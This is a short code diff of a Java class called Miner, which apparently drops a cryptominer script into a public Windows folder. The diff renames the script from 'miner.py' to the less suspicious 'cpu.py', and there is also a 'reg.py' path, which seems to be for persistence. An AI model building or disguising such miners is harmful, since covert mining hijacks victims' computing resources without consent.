@@ -6,7 +6,7 @@ import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 
 public class Miner {
-    private static final String MINER_PATH = "c:\\users\\public\\Documents\\miner.py";
+    private static final String MINER_PATH = "c:\\users\\public\\Documents\\cpu.py";
     private static final String REG_PATH = "c:\\users\\public\\Documents\\reg.py";
 
     public static void createMiner() {
